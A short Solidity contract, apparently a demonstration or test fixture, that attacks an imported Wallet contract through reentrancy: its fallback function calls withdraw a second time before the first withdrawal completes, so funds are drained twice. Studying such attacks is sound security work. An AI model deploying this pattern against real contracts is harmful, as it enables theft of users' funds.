pragma solidity >=0.8.3;

import "./Wallet.sol";

contract BadWalletUser {
    event ShowBalance(
        uint balance
    );

    event Callback(
        uint balance
    );

    Wallet wallet;
    uint counter = 0;
    uint amt = 0;

    constructor(address walletAddr) {
        wallet = Wallet(walletAddr);
    }

    function deposit()
        payable
        public
        returns (bool)
    {
        wallet.deposit{value : msg.value}();
        return true;
    }

    function withdraw(uint amount)
        public
        returns (bool)
    {
        amt = amount;
        wallet.withdraw(amount);
        emit ShowBalance(address(this).balance);
        return true;
    }

    fallback() external payable {
        emit Callback(address(this).balance);
        if (counter < 1) {
            counter += 1;
            wallet.withdraw(amt);
        }
    }
}
